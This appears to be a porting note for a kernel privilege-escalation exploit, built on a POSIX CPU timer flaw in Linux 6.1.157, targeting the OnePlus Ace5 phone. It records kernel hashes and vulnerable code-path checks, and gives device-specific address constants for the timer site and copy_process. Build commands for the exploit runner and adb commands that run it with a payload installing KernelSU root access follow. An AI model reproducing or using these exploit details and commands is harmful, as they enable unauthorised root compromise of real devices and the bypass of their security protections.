# OnePlus Ace5 (PKG110) 6.1.157 experimental port

Status: **offline analysis + runner built; not tested on Ace5 hardware**

## Source image

```text
boot_PKG110_17.0.0.105.img
SHA-256 4982883BD96CE82BF34EAF2DE1DF4FF98D7707C8931C5C636B4D50D7E8542ABF
Android boot v4, kernel at +0x1000, size 35899904
Kernel 6.1.157-android14-11-o-g7cdd565ce1ed
Kernel SHA-256 A3779DC143AE762DF56C7046EF90CE8862B24C027E82870ED30DF438C056E8E6
```

## Applicability

`timer-extract` on the boot image:

```text
vulnerable YES
begin_new_exec: unshare_files, set_mm_exe_file run before posix_cpu_timers_exit
posix_cpu_timer_del: pid_task()==NULL at +0x3f396c, timerqueue_del not called
task BTF 0x12c0, max 0x16c0
selinux cred blob offset 0x0
```

Same 6.1.157 GKI layout as the OP12, but the code addresses differ:

| value | OP12 (g3d5d51510424) | Ace5 (g7cdd565ce1ed) |
|---|---|---|
| timer site | `0xffffffc00844bcac` / low21 `0x4bcac` | `0xffffffc00844bc08` / low21 `0x4bc08` |
| copy_process low21 | `0x1ec6b4` | `0x1e7400` |
| selinux_state | same | same |
| root_user / init namespaces | same | same |
| task bytes / cred sizes | `0x12c0` / `0xb0`,`0xc0` | same |
| cred uid / selinux blob | `0x4` / `0x0` | same |

The OP12 runner must **not** be reused on Ace5: the timer and copy-process
constants are different. The new runner is built with
`IC_PROFILE_ACE5_61157`.

## Build

```bash
cd Shark/experiments/ic-timer-lpe/core
CC=<ndk>/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android29-clang \
  sh build.sh ../../../ports/ace5-61157/ic-ace5 ace5_61157
```

## Test on Ace5

Not tested here because no Ace5 is attached. The next step is a clean boot with
Shizuku, then:

```bash
adb push ports/ace5-61157/ic-ace5 /data/local/tmp/ic-ace5
adb shell 'chmod 755 /data/local/tmp/ic-ace5; cd /data/local/tmp; \
  PAYLOAD_CMD="sh /data/local/tmp/ksu_stage.sh" ./ic-ace5 ksu'
```

Do not run this on OP12; the profile has an exact Ace5 kernel match and the
OP12 runner remains separate. Collect the full log and verify KSU before
considering app/release integration.